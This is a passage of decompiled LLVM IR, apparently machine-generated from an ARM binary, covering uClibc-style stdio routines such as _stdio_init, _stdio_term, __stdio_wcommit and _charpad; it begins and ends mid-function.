  %v2_ff64 = add i32 %v1_ff58, 4096
  store i32 %v2_ff64, i32* %r2.global-to-local, align 4
  %v2_ff68 = or i32 %v4_ff60, 16384
  store i32 %v2_ff68, i32* %r3.global-to-local, align 4
  %v2_ff6c = add i32 %v1_ff6c.pre, 8
  %v3_ff6c = inttoptr i32 %v2_ff6c to i32*
  store i32 %v1_ff58, i32* %v3_ff6c, align 4
  %v1_ff70 = load i32, i32* %r2.global-to-local, align 4
  %v2_ff70 = load i32, i32* @sb, align 4
  %v3_ff70 = add i32 %v2_ff70, 12
  %v4_ff70 = inttoptr i32 %v3_ff70 to i32*
  store i32 %v1_ff70, i32* %v4_ff70, align 4
  %v1_ff74 = load i32, i32* %r3.global-to-local, align 4
  %v2_ff74 = trunc i32 %v1_ff74 to i16
  %v3_ff74 = load i32, i32* @sb, align 4
  %v4_ff74 = inttoptr i32 %v3_ff74 to i16*
  store i16 %v2_ff74, i16* %v4_ff74, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_ff54
  %v2_ff6c21 = add i32 %v1_ff6c.pre, 8
  %v3_ff6c22 = inttoptr i32 %v2_ff6c21 to i32*
  store i32 0, i32* %v3_ff6c22, align 4
  %v2_ff78 = load i32, i32* @sb, align 4
  %v3_ff78 = add i32 %v2_ff78, 12
  %v4_ff78 = inttoptr i32 %v3_ff78 to i32*
  store i32 0, i32* %v4_ff78, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_ff48, %.thread11
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_ff84 = load i32, i32* @fp, align 4
  %v2_ff84 = add i32 %v0_ff84, 60
  %v3_ff84 = inttoptr i32 %v2_ff84 to i32*
  %v4_ff84 = load i32, i32* %v3_ff84, align 4
  store i32 %v4_ff84, i32* %r3.global-to-local, align 4
  %v2_ff88 = load i32, i32* @sb, align 4
  %v3_ff88 = add i32 %v2_ff88, 2
  %v4_ff88 = inttoptr i32 %v3_ff88 to i8*
  store i8 0, i8* %v4_ff88, align 1
  %v0_ff8c = load i32, i32* @sb, align 4
  %v1_ff8c = inttoptr i32 %v0_ff8c to i16*
  %v2_ff8c = load i16, i16* %v1_ff8c, align 2
  %v3_ff8c = zext i16 %v2_ff8c to i32
  store i32 %v3_ff8c, i32* %r2.global-to-local, align 4
  %v0_ff90 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff90 = inttoptr i32 %v0_ff90 to i32*
  %v2_ff90 = load i32, i32* %v1_ff90, align 4
  store i32 %v2_ff90, i32* %r1.global-to-local, align 4
  %v1_ff94 = add i32 %v0_ff8c, 8
  %v2_ff94 = inttoptr i32 %v1_ff94 to i32*
  %v3_ff94 = load i32, i32* %v2_ff94, align 4
  store i32 %v3_ff94, i32* %r3.global-to-local, align 4
  %v1_ff98 = and i32 %v3_ff8c, 8192
  %v2_ff98 = icmp eq i32 %v1_ff98, 0
  %v2_ff9c = add i32 %v0_ff8c, 20
  %v3_ff9c = inttoptr i32 %v2_ff9c to i32*
  store i32 %v3_ff94, i32* %v3_ff9c, align 4
  %v0_ffa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_ffa0 = load i32, i32* @sb, align 4
  %v2_ffa0 = add i32 %v1_ffa0, 44
  %v3_ffa0 = inttoptr i32 %v2_ffa0 to i32*
  store i32 %v0_ffa0, i32* %v3_ffa0, align 4
  %v0_ffa4 = load i32, i32* %r1.global-to-local, align 4
  %v1_ffa4 = load i32, i32* @sb, align 4
  %v2_ffa4 = add i32 %v1_ffa4, 52
  %v3_ffa4 = inttoptr i32 %v2_ffa4 to i32*
  store i32 %v0_ffa4, i32* %v3_ffa4, align 4
  %v0_ffa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_ffa8 = load i32, i32* @sb, align 4
  %v2_ffa8 = add i32 %v1_ffa8, 24
  %v3_ffa8 = inttoptr i32 %v2_ffa8 to i32*
  store i32 %v0_ffa8, i32* %v3_ffa8, align 4
  %v0_ffac = load i32, i32* %r3.global-to-local, align 4
  %v1_ffac = load i32, i32* @sb, align 4
  %v2_ffac = add i32 %v1_ffac, 28
  %v3_ffac = inttoptr i32 %v2_ffac to i32*
  store i32 %v0_ffac, i32* %v3_ffac, align 4
  %v0_ffb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_ffb0 = load i32, i32* @sb, align 4
  %v2_ffb0 = add i32 %v1_ffb0, 16
  %v3_ffb0 = inttoptr i32 %v2_ffb0 to i32*
  store i32 %v0_ffb0, i32* %v3_ffb0, align 4
  br i1 %v2_ff98, label %dec_label_pc_1006c, label %dec_label_pc_ffb8

dec_label_pc_ffb8:                                ; preds = %bb42
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_ffbc = load i32, i32* @fp, align 4
  %v2_ffbc = add i32 %v0_ffbc, 36
  %v3_ffbc = inttoptr i32 %v2_ffbc to i32*
  %v4_ffbc = load i32, i32* %v3_ffbc, align 4
  store i32 %v4_ffbc, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_ffc4 = add i32 %v0_ffbc, 112
  %v3_ffc4 = inttoptr i32 %v2_ffc4 to i32*
  %v4_ffc4 = load i32, i32* %v3_ffc4, align 4
  store i32 %v4_ffc4, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_ffcc = ptrtoint i32* %stack_var_-56 to i32
  %v2_ffd0 = add i32 %v0_ffbc, 76
  %v3_ffd0 = inttoptr i32 %v2_ffd0 to i32*
  %v4_ffd0 = load i32, i32* %v3_ffd0, align 4
  store i32 %v4_ffbc, i32* %r1.global-to-local, align 4
  store i32 %v4_ffc4, i32* %r2.global-to-local, align 4
  store i32 %v2_ffcc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ffd0)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_ffec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ffec, i32* %r0.global-to-local, align 4
  %v0_fff0 = load i32, i32* @fp, align 4
  %v2_fff0 = add i32 %v0_fff0, 16
  %v3_fff0 = inttoptr i32 %v2_fff0 to i32*
  %v4_fff0 = load i32, i32* %v3_fff0, align 4
  call void @__pseudo_branch(i32 %v4_fff0)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_10000 = load i32, i32* @fp, align 4
  %v2_10000 = add i32 %v0_10000, 100
  %v3_10000 = inttoptr i32 %v2_10000 to i32*
  %v4_10000 = load i32, i32* %v3_10000, align 4
  store i32 %v4_10000, i32* %r4.global-to-local, align 4
  %v0_10004 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10004, i32* %r1.global-to-local, align 4
  store i32 %v4_10000, i32* %r2.global-to-local, align 4
  store i32 %v2_fdbc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ffd0)
  store i32 %v4_10000, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_fff0)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_10028 = load i32, i32* @fp, align 4
  %v2_10028 = add i32 %v0_10028, 48
  %v3_10028 = inttoptr i32 %v2_10028 to i32*
  %v4_10028 = load i32, i32* %v3_10028, align 4
  store i32 %v4_10028, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_10030 = inttoptr i32 %v4_10028 to i32*
  %v2_10030 = load i32, i32* %v1_10030, align 4
  store i32 %v2_10030, i32* %r2.global-to-local, align 4
  store i32 %v2_fdbc, i32* %r0.global-to-local, align 4
  %v1_10038 = load i32, i32* @sb, align 4
  %v2_10038 = add i32 %v1_10038, 32
  %v3_10038 = inttoptr i32 %v2_10038 to i32*
  store i32 %v2_10030, i32* %v3_10038, align 4
  %v0_1003c = load i32, i32* @fp, align 4
  %v1_1003c = load i32, i32* %r3.global-to-local, align 4
  %v2_1003c = add i32 %v1_1003c, %v0_1003c
  %v3_1003c = inttoptr i32 %v2_1003c to i32*
  %v4_1003c = load i32, i32* %v3_1003c, align 4
  store i32 %v4_1003c, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_10044 = load i32, i32* @sb, align 4
  %v1_10044 = load i32, i32* @ip, align 4
  %v2_10044 = inttoptr i32 %v1_10044 to i32*
  store i32 %v0_10044, i32* %v2_10044, align 4
  call void @__pseudo_branch(i32 %v4_1003c)
  store i32 %v2_ffcc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1003c)
  br label %dec_label_pc_1006c

dec_label_pc_10068:                               ; preds = %dec_label_pc_fdfc, %dec_label_pc_fde8, %dec_label_pc_fe08
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_1006c

dec_label_pc_1006c:                               ; preds = %bb42, %dec_label_pc_fe40, %dec_label_pc_ffb8, %dec_label_pc_10068
  %v0_1006c = load i32, i32* @sb, align 4
  store i32 %v0_1006c, i32* %r0.global-to-local, align 4
  %v2_10074 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10074, i32* @r4, align 4
  store i32 %v6_fda8, i32* @r5, align 4
  store i32 %v9_fda8, i32* @r6, align 4
  store i32 %v18_fda8, i32* @sb, align 4
  store i32 %v24_fda8, i32* @fp, align 4
  ret i32 %v0_1006c

; uselistorder directives
  uselistorder i32 %v1_ff6c.pre, { 2, 1, 0 }
  uselistorder i32 %v1_ff58, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ff00, { 1, 2, 0 }
  uselistorder i32 %v0_fecc, { 1, 0 }
  uselistorder i32 %v1_fe90, { 1, 0 }
  uselistorder i32 %v0_fe90, { 1, 0 }
  uselistorder i32 %v1_fe78, { 1, 0, 2 }
  uselistorder i32 %v1_fe30, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1006c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10068, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff48, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_fec0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fe68, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_fe18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fde8, { 1, 2, 0 }
}

define i32 @function_10080(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10080:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10080 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10080, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_10080
  %v3_10088 = and i32 %arg4, %arg3
  %v2_1008c = trunc i32 %v3_10088 to i16
  %v4_1008c = inttoptr i32 %v3_10088 to i16*
  store i16 %v2_1008c, i16* %v4_1008c, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_10080, %bb
  %v10_100ac = phi i32 [ %tmp, %dec_label_pc_10080 ], [ 0, %bb ]
  ret i32 %v10_100ac

; uselistorder directives
  uselistorder i32 %v3_10088, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_100b4 = call i32 @__GI___errno_location()
  store i32 %v0_100b4, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_100c0 = inttoptr i32 %v0_100b4 to i32*
  %v2_100c0 = load i32, i32* %v1_100c0, align 4
  store i32 %v2_100c0, i32* @r6, align 4
  %v1_100c4 = call i32 @isatty(i32 0)
  %v2_100cc = icmp eq i32 %v1_100c4, 0
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r4, align 4
  br i1 %v2_100cc, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_100d8 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 612) to i16*), align 2
  %v7_100d8 = zext i16 %v5_100d8 to i32
  %v2_100dc = xor i32 %v7_100d8, 256
  store i32 %v2_100dc, i32* @r3, align 4
  %v2_100e0 = trunc i32 %v2_100dc to i16
  store i16 %v2_100e0, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 612) to i16*), align 2
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_100e8 = call i32 @isatty(i32 1)
  %v2_100ec = icmp eq i32 %v1_100e8, 0
  br i1 %v2_100ec, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_100f4 = load i32, i32* @r4, align 4
  %v2_100f8 = add i32 %v1_100f4, 692
  %v3_100f8 = inttoptr i32 %v2_100f8 to i16*
  %v4_100f8 = load i16, i16* %v3_100f8, align 2
  %v2_100fc = xor i16 %v4_100f8, 256
  store i16 %v2_100fc, i16* %v3_100f8, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_10104 = load i32, i32* @r6, align 4
  %v1_10104 = load i32, i32* @r5, align 4
  %v2_10104 = inttoptr i32 %v1_10104 to i32*
  store i32 %v0_10104, i32* %v2_10104, align 4
  ret i32 %v1_100e8

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -38272), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_10134 = call i32 @memcpy()
  ret i32 %v0_10134
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1014c = load i32, i32* @r4, align 4
  store i32 %v3_1014c, i32* %stack_var_-24, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r6.global-to-local, align 4
  %v4_1015c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 100) to i32*), align 4
  store i32 %v4_1015c, i32* @r0, align 4
  %v1_10160 = call i32 @__stdio_init_mutex(i32 %v4_1015c)
  store i32 %v1_10160, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_10168 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 112) to i32*), align 4
  store i32 %v4_10168, i32* @r0, align 4
  %v1_1016c = call i32 @__stdio_init_mutex(i32 %v4_10168)
  store i32 %v1_1016c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_10174 = load i32, i32* %r6.global-to-local, align 4
  %v2_10174 = add i32 %v0_10174, 48
  %v3_10174 = inttoptr i32 %v2_10174 to i32*
  %v4_10174 = load i32, i32* %v3_10174, align 4
  store i32 %v4_10174, i32* %r3.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  %v1_1017c = inttoptr i32 %v4_10174 to i32*
  %v2_1017c = load i32, i32* %v1_1017c, align 4
  store i32 %v2_1017c, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_101c85 = add i32 %v2_1017c, 56
  store i32 %v1_101c85, i32* @r5, align 4
  %v2_101cc7 = icmp eq i32 %v2_1017c, 0
  store i32 %v1_101c85, i32* %r0.global-to-local, align 4
  br i1 %v2_101cc7, label %dec_label_pc_101d8, label %dec_label_pc_10188

dec_label_pc_10188:                               ; preds = %entry, %dec_label_pc_101bc.dec_label_pc_10188_crit_edge
  %v1_10188 = phi i32 [ %v1_10188.pre, %dec_label_pc_101bc.dec_label_pc_10188_crit_edge ], [ 44, %entry ]
  %v0_10188 = phi i32 [ %v0_101dc.pre, %dec_label_pc_101bc.dec_label_pc_10188_crit_edge ], [ %v0_10174, %entry ]
  %v2_10188 = add i32 %v0_10188, %v1_10188
  %v3_10188 = inttoptr i32 %v2_10188 to i32*
  %v4_10188 = load i32, i32* %v3_10188, align 4
  store i32 %v4_10188, i32* @ip, align 4
  store i32 65940, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10188)
  %v0_10194 = load i32, i32* %r0.global-to-local, align 4
  %v2_10194 = icmp eq i32 %v0_10194, 0
  %v0_10198 = load i32, i32* @r5, align 4
  store i32 %v0_10198, i32* @r0, align 4
  br i1 %v2_10194, label %dec_label_pc_101bc, label %dec_label_pc_101a0

dec_label_pc_101a0:                               ; preds = %dec_label_pc_10188
  %v0_101a0 = load i32, i32* @r4, align 4
  %v1_101a0 = add i32 %v0_101a0, 8
  %v2_101a0 = inttoptr i32 %v1_101a0 to i32*
  %v3_101a0 = load i32, i32* %v2_101a0, align 4
  store i32 %v3_101a0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_101a8 = add i32 %v0_101a0, 20
  %v3_101a8 = inttoptr i32 %v2_101a8 to i32*
  store i32 %v3_101a0, i32* %v3_101a8, align 4
  %v0_101ac = load i32, i32* %r2.global-to-local, align 4
  %v1_101ac = trunc i32 %v0_101ac to i16
  %v2_101ac = load i32, i32* @r4, align 4
  %v3_101ac = inttoptr i32 %v2_101ac to i16*
  store i16 %v1_101ac, i16* %v3_101ac, align 2
  %v0_101b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_101b0 = load i32, i32* @r4, align 4
  %v2_101b0 = add i32 %v1_101b0, 24
  %v3_101b0 = inttoptr i32 %v2_101b0 to i32*
  store i32 %v0_101b0, i32* %v3_101b0, align 4
  %v0_101b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_101b4 = load i32, i32* @r4, align 4
  %v2_101b4 = add i32 %v1_101b4, 28
  %v3_101b4 = inttoptr i32 %v2_101b4 to i32*
  store i32 %v0_101b4, i32* %v3_101b4, align 4
  %v0_101b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_101b8 = load i32, i32* @r4, align 4
  %v2_101b8 = add i32 %v1_101b8, 16
  %v3_101b8 = inttoptr i32 %v2_101b8 to i32*
  store i32 %v0_101b8, i32* %v3_101b8, align 4
  br label %dec_label_pc_101bc

dec_label_pc_101bc:                               ; preds = %dec_label_pc_10188, %dec_label_pc_101a0
  %v0_101bc = load i32, i32* %r7.global-to-local, align 4
  %v1_101bc = load i32, i32* @r4, align 4
  %v2_101bc = add i32 %v1_101bc, 52
  %v3_101bc = inttoptr i32 %v2_101bc to i32*
  store i32 %v0_101bc, i32* %v3_101bc, align 4
  %v1_101c0 = call i32 @__stdio_init_mutex(i32 %v0_10198)
  store i32 %v1_101c0, i32* %r0.global-to-local, align 4
  %v0_101c4 = load i32, i32* @r4, align 4
  %v1_101c4 = add i32 %v0_101c4, 32
  %v2_101c4 = inttoptr i32 %v1_101c4 to i32*
  %v3_101c4 = load i32, i32* %v2_101c4, align 4
  store i32 %v3_101c4, i32* @r4, align 4
  %v1_101c8 = add i32 %v3_101c4, 56
  store i32 %v1_101c8, i32* @r5, align 4
  %v2_101cc = icmp eq i32 %v3_101c4, 0
  store i32 %v1_101c8, i32* %r0.global-to-local, align 4
  %v0_101dc.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_101cc, label %dec_label_pc_101d8, label %dec_label_pc_101bc.dec_label_pc_10188_crit_edge

dec_label_pc_101bc.dec_label_pc_10188_crit_edge:  ; preds = %dec_label_pc_101bc
  %v1_10188.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10188

dec_label_pc_101d8:                               ; preds = %dec_label_pc_101bc, %entry
  %v1_1020814 = phi i32 [ %v1_101c85, %entry ], [ %v1_101c8, %dec_label_pc_101bc ]
  %v0_101dc = phi i32 [ %v0_10174, %entry ], [ %v0_101dc.pre, %dec_label_pc_101bc ]
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_101dc = add i32 %v0_101dc, 48
  %v3_101dc = inttoptr i32 %v2_101dc to i32*
  %v4_101dc = load i32, i32* %v3_101dc, align 4
  store i32 %v4_101dc, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_101dc to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_101fc4 = icmp eq i32 %storemerge2, 0
  br i1 %v2_101fc4, label %dec_label_pc_10204, label %dec_label_pc_101e8

dec_label_pc_101e8:                               ; preds = %dec_label_pc_101d8, %dec_label_pc_101fc
  %v1_101f0 = phi i32 [ %storemerge, %dec_label_pc_101fc ], [ %storemerge2, %dec_label_pc_101d8 ]
  %v1_101e8 = inttoptr i32 %v1_101f0 to i16*
  %v2_101e8 = load i16, i16* %v1_101e8, align 2
  %v3_101e8 = zext i16 %v2_101e8 to i32
  store i32 %v3_101e8, i32* %r3.global-to-local, align 4
  %v1_101ec = and i32 %v3_101e8, 64
  %v2_101ec = icmp eq i32 %v1_101ec, 0
  br i1 %v2_101ec, label %dec_label_pc_101fc, label %bb

bb:                                               ; preds = %dec_label_pc_101e8
  store i32 %v1_101f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_101fc

dec_label_pc_101fc:                               ; preds = %dec_label_pc_101e8, %bb
  %v1_101f4 = xor i1 %v2_101ec, true
  call void @__pseudo_cond_branch(i1 %v1_101f4, i32 ptrtoint (i32* @global_var_10220.337 to i32))
  %v0_101f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_101f8 = add i32 %v0_101f8, 32
  %storemerge.in = inttoptr i32 %v1_101f8 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_101fc = icmp eq i32 %storemerge, 0
  br i1 %v2_101fc, label %dec_label_pc_101fc.dec_label_pc_10204_crit_edge, label %dec_label_pc_101e8

dec_label_pc_101fc.dec_label_pc_10204_crit_edge:  ; preds = %dec_label_pc_101fc
  %v1_10208.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10204

dec_label_pc_10204:                               ; preds = %dec_label_pc_101fc.dec_label_pc_10204_crit_edge, %dec_label_pc_101d8
  %v1_10208 = phi i32 [ %v1_10208.pre, %dec_label_pc_101fc.dec_label_pc_10204_crit_edge ], [ %v1_1020814, %dec_label_pc_101d8 ]
  %v2_10204 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10204, i32* %r4.global-to-local, align 4
  ret i32 %v1_10208

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10174, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 7, 1, 2, 3, 6, 8, 4, 5, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_101fc, { 1, 0 }
  uselistorder label %dec_label_pc_101e8, { 1, 0 }
  uselistorder label %dec_label_pc_101bc, { 1, 0 }
  uselistorder label %dec_label_pc_10188, { 1, 0 }
}

define i32 @function_10210(i32 %arg1) local_unnamed_addr {
dec_label_pc_10210:
  %v0_10210 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10210, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10210
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10210, %bb
  %v4_1021c = phi i32 [ %arg1, %dec_label_pc_10210 ], [ 0, %bb ]
  ret i32 %v4_1021c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10220 = load i32, i32* @r4, align 4
  store i32 %v3_10220, i32* %stack_var_-8, align 4
  %v0_10224 = load i32, i32* @r0, align 4
  %v1_10224 = add i32 %v0_10224, 8
  %v2_10224 = inttoptr i32 %v1_10224 to i32*
  %v3_10224 = load i32, i32* %v2_10224, align 4
  %v1_10228 = add i32 %v0_10224, 16
  %v2_10228 = inttoptr i32 %v1_10228 to i32*
  %v3_10228 = load i32, i32* %v2_10228, align 4
  %v9_1022c = icmp eq i32 %v3_10228, %v3_10224
  store i32 %v0_10224, i32* %r4.global-to-local, align 4
  br i1 %v9_1022c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_10224, i32* %v2_10228, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_10238 = xor i1 %v9_1022c, true
  call void @__pseudo_cond_branch(i1 %v1_10238, i32 ptrtoint (i32* @global_var_15c2c.338 to i32))
  %v0_1023c = load i32, i32* %r4.global-to-local, align 4
  %v1_1023c = add i32 %v0_1023c, 8
  %v2_1023c = inttoptr i32 %v1_1023c to i32*
  %v3_1023c = load i32, i32* %v2_1023c, align 4
  %v1_10240 = add i32 %v0_1023c, 16
  %v2_10240 = inttoptr i32 %v1_10240 to i32*
  %v3_10240 = load i32, i32* %v2_10240, align 4
  %v2_10244 = sub i32 %v3_10240, %v3_1023c
  %v2_10248 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10248, i32* @r4, align 4
  ret i32 %v2_10244

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_10250 = load i32, i32* @r4, align 4
  %v6_10250 = load i32, i32* @r5, align 4
  %v9_10250 = load i32, i32* @r6, align 4
  %v12_10250 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_1025c = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_1025c, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_102742 = icmp eq i32 %arg3, 0
  br i1 %v2_102742, label %dec_label_pc_10294, label %dec_label_pc_10288

dec_label_pc_10270:                               ; preds = %dec_label_pc_10288
  %v1_10270 = add i32 %v0_10270, -1
  store i32 %v1_10270, i32* @r4, align 4
  %v2_10274 = icmp eq i32 %v1_10270, 0
  %v0_10280 = load i32, i32* @r7, align 4
  br i1 %v2_10274, label %dec_label_pc_10294.loopexit, label %dec_label_pc_10288

dec_label_pc_10288:                               ; preds = %entry, %dec_label_pc_10270
  %v0_102804 = phi i32 [ %v0_10280, %dec_label_pc_10270 ], [ %arg1, %entry ]
  %v3_10288 = inttoptr i32 %v0_102804 to i16*
  %v4_10288 = call i32 @__stdio_fwrite(i32 %v10_1025c, i32 1, i16* %v3_10288)
  %v7_1028c = icmp eq i32 %v4_10288, 1
  %v0_10270 = load i32, i32* @r4, align 4
  br i1 %v7_1028c, label %dec_label_pc_10270, label %dec_label_pc_10294.loopexit

dec_label_pc_10294.loopexit:                      ; preds = %dec_label_pc_10270, %dec_label_pc_10288
  %v0_10294.ph = phi i32 [ %v0_10270, %dec_label_pc_10288 ], [ 0, %dec_label_pc_10270 ]
  %v1_10294.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10294

dec_label_pc_10294:                               ; preds = %dec_label_pc_10294.loopexit, %entry
  %v1_10294 = phi i32 [ 0, %entry ], [ %v1_10294.pre, %dec_label_pc_10294.loopexit ]
  %v0_10294 = phi i32 [ 0, %entry ], [ %v0_10294.ph, %dec_label_pc_10294.loopexit ]
  %v2_10294 = sub i32 %v1_10294, %v0_10294
  store i32 %v3_10250, i32* @r4, align 4
  store i32 %v6_10250, i32* @r5, align 4
  store i32 %v9_10250, i32* @r6, align 4
  store i32 %v12_10250, i32* @r7, align 4
  ret i32 %v2_10294

; uselistorder directives
  uselistorder i32 %v1_10270, { 1, 0 }
  uselistorder label %dec_label_pc_10294.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10288, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_102a4 = load i32, i32* @r4, align 4
  store i32 %v3_102a4, i32* %stack_var_-24, align 4
  %v6_102a4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_102ac = and i32 %arg2, 128
  %v2_102ac = icmp eq i32 %v1_102ac, 0
  %v0_102b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_102b0, i32* @r8, align 4
